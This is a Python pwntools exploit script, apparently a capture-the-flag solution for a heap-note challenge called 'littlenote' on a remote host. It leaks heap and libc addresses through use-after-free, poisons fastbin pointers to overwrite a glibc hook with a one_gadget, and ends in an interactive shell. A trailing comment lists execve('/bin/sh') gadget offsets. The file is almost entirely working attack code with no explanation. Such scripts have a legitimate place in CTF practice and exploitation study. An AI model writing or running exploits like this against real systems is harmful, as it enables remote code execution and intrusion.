#encoding:utf-8

from pwn import *

context.log_level='debug'

#p=process('./littlenote',env={'LD_PRELOAD':'./libc.so.6'})
p = remote('202.0.1.56',40001)
elf=ELF('./libc.so.6')

free_hook=elf.symbols['__free_hook']
one_gadget=0xf0274

sd=lambda x : p.send(x)
sl=lambda x : p.sendline(x)
sla=lambda a,x : p.sendlineafter(a,x)
rv=lambda x : p.recvuntil(x)
sa=lambda a,x : p.sendafter(a,x)


def alloc(content='',is_keep='Y'):
    sla('Your choice:\n','1')
    sla('Enter your note\n',content)
    sla('Want to keep your note?\n',is_keep)

def show(index,out=0,content=''):
    sla('Your choice:\n','2')
    if out:
        sla('Which note do you want to show?\n',content)
    else:
        sla('Which note do you want to show?\n',str(index))

def dele(index):
    sla('Your choice:\n','3')
    sla('Which note do you want to delete?\n',str(index))


alloc()     # 0
alloc()     # 1
alloc()     # 2
alloc()     # 3

dele(0)
dele(1)
dele(2)

show(2)
chunk_base=u64(p.recv(6)+2*'\x00')-0x70
log.info('chunk_base:'+hex(chunk_base))

show(0,1,'1'*0x400)

alloc()     # 4 (0)
show(4)
libc_base=u64(p.recv(6)+2*'\x00')-0x3c4c0a
log.info('libc_base:'+hex(libc_base))

alloc()     # 5 (1)
alloc()     # 6 (2)

dele(4)
dele(1)
dele(0)

alloc(p64(libc_base+0x3c4aed))
alloc(p64(libc_base+0x3c4aed))
alloc(p64(libc_base+0x3c4aed))
alloc('a'*0x13+p64(libc_base+one_gadget))

sla('Your choice:\n','1')

p.interactive()


'''
0x45216	execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a	execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf0274	execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1117	execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL

'''
